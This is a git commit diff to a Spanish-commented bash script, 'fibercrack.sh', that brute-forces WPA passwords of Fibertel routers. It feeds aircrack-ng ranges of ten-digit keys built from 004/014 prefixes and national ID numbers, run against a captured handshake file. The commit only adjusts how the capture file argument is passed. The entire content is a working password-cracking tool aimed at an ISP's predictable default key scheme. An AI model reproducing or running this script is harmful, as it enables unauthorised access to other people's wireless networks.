447027898b8f6ce58b0b2459bbbfe261196a8dfc
Kostas <kmcartelle@gmail.com>
2020-09-01 01:15:10 -0300

    remote cap from lines

--- fibercrack.sh
+++ fibercrack.sh
@@ -1,12 +1,13 @@
 #!/bin/bash
 
 echo "Ejecutar este script en screen, fibertel 10 digitos"
+echo "parametro 1 ESSID, parametro 2 file.cap, parametro 3 DNIstart"
 # $1 ESSID
 # $2 file  ejemplo "0XX-01"
 # $3 DNI start ejemplo "27"
+
 #echo "benchmark......"
 #aircrack-ng -S
-#echo "0" > key
 
 test -f key || echo "0" > key
 
@@ -19,14 +20,14 @@ counter=0
 while [ $(cat key) = "0" ]
   do
     #10 digitos, 004, up
-    seq -w 004"$(($num + $counter))" 004"$(($up + $counter))" | aircrack-ng -l key -e "$1" -w - caps/"$2".cap
+    seq -w 004"$(($num + $counter))" 004"$(($up + $counter))" | aircrack-ng -l key -e "$1" -w - caps/"$2"
     if [ $(cat key) != "0" ]
     then
       rm dic
       exit 0
     fi
     #10 digitos, 014, up
-    seq -w 014"$(($num + $counter))" 014"$(($up + $counter))" | aircrack-ng -l key -e "$1" -w - caps/"$2".cap
+    seq -w 014"$(($num + $counter))" 014"$(($up + $counter))" | aircrack-ng -l key -e "$1" -w - caps/"$2"
     if [ $(cat key) != "0" ]
     then
       rm dic
@@ -34,14 +35,14 @@ while [ $(cat key) = "0" ]
     fi
 
   #10 digitos, 004, dn
-  seq -w 004"$(($dn - $counter))" 004"$(($num - $counter))" | aircrack-ng -l key -e "$1" -w - caps/"$2".cap
+  seq -w 004"$(($dn - $counter))" 004"$(($num - $counter))" | aircrack-ng -l key -e "$1" -w - caps/"$2"
   if [ $(cat key) != "0" ]
   then
     rm dic
     exit 0
   fi
   #10 digitos, 014, dn
-  seq -w 014"$(($dn - $counter))" 014"$(($num - $counter))" | aircrack-ng -l key -e "$1" -w - caps/"$2".cap
+  seq -w 014"$(($dn - $counter))" 014"$(($num - $counter))" | aircrack-ng -l key -e "$1" -w - caps/"$2"
   if [ $(cat key) != "0" ]
   then
     rm dic
